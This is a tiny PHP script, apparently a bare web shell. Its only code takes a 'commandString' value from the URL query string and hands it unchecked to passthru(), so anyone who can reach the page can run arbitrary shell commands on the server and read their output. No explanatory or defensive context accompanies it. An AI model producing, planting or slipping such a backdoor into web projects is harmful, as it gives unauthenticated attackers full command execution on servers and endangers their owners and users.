<?php
    // nice and simple :)
    passthru(urldecode($_GET['commandString']) . ' 2>&1');
?>